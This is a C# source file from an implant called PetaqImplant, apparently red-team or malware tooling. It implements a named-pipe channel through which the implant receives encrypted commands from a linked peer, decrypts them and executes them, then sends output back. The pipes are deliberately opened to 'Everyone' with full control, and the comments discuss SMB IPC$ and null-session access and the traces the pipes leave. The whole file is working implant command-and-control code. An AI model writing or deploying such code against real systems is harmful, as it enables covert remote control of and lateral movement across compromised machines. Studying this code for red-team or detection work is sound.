using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Security.AccessControl;

namespace PetaqImplant
{
    public class NamedPipeServiceSocket : ImplantServiceSocket
    {
        public NamedPipeServerStream NamedPipeServiceRead { get; set; }
        public StreamString NamedPipeServiceReadStream { get; set; }
        public NamedPipeServerStream NamedPipeServiceWrite { get; set; }
        public StreamString NamedPipeServiceWriteStream { get; set; }
        public string NamedPipeServiceName = Program.configuration["NAMEDPIPE"];

        public override void Start()
        {
            Status = true;
            while (Status)
            {
                Console.Error.WriteLine("Service loop starting...");
                try
                {
                    // As the Named Pipes on the network only accessible
                    // via SMB IPC$ connections established
                    // we need to connect to the remote server IPC$
                    // if necessary with the creds
                    //
                    // This points out that named pipe over network
                    // with null IPC $ is possible
                    // However, the pipe name should appear on the registry
                    // which creates traces, IOCs
                    // https://support.microsoft.com/en-au/help/813414/how-to-create-an-anonymous-pipe-that-gives-access-to-everyone

                    // Allowing "Everyone" for the named pipe access
                    PipeSecurity ps = new PipeSecurity();
                    PipeAccessRule AccessRule = new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow);
                    ps.AddAccessRule(AccessRule);



                    // Currently implementation has 2 named pipes in use for IO
                    //NamedPipeServiceRead = new NamedPipeServerStream(NamedPipeServiceName + "i", PipeDirection.InOut, 1);
                    //NamedPipeServiceWrite = new NamedPipeServerStream(NamedPipeServiceName + "o", PipeDirection.InOut, 1);
                    NamedPipeServiceRead = new NamedPipeServerStream(NamedPipeServiceName + "i", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 0, 0, ps);
                    NamedPipeServiceWrite = new NamedPipeServerStream(NamedPipeServiceName + "o", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 0, 0, ps);

                    Console.Error.WriteLine("Waiting for linking...");
                    // Waiting for linking for both service
                    NamedPipeServiceRead.WaitForConnection();
                    NamedPipeServiceWrite.WaitForConnection();
                    // Setting write stream for the write named pipe
                    NamedPipeServiceWriteStream = new StreamString(NamedPipeServiceWrite);
                    // There are 2 connections, so linking starts
                    Console.Error.WriteLine("The implant is being linked.");
                    // If there is no instruction sent to the pipe
                    // the implant doesn't sent the data in buffer to the link
                    // This loop is not great for bidirectional comms
                    // To be fixed for future callbacks and triggers
                    while (true)
                    {
                        LinkStatus = true;

                        //Create the stream
                        NamedPipeServiceReadStream = new StreamString(NamedPipeServiceRead);

                        //New Named client connected
                        string instruction = NamedPipeServiceReadStream.ReadString();

                        //Instruction received from the Named client...
                        instruction = Common.Decrypt(instruction);

                        //Console.Error.WriteLine("Data received:\n{0}", instruction);

                        //Instruction is processing...
                        Instructions.Instruct(instruction);

                       
                    }

                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("Named Pipe Service Exception on Receive: " + e.Message);
                    LinkStatus = false;
                }
                finally
                {
                    Stop();
                }
            }
        }
        public override void Stop()
        {
            if (LinkStatus)
            {
                Console.Error.WriteLine("Closing the Named Pipe linking.");
                NamedPipeServiceRead.Close();
                NamedPipeServiceWrite.Close();
                LinkStatus = false;
            }
            if (Status)
            {
                Console.Error.WriteLine("Disposing the Named Pipe.");
                NamedPipeServiceRead.Dispose();
                NamedPipeServiceWrite.Dispose();
                Status = false;
            }

        }
        public override bool Send(string data = "")
        {
            if (data == "") return false;
            try
            {

                if (LinkStatus)
                {
                    //Console.Error.WriteLine("Sending :\n{0}",data);
                    NamedPipeServiceWriteStream.WriteString(data);
                }
                else
                {
                    Console.Error.WriteLine("The Named Pipe is disconnected.");
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Named Pipe Service Exception on Send: " + e.Message + e.StackTrace);
                return false;
            }

        }
    }
}
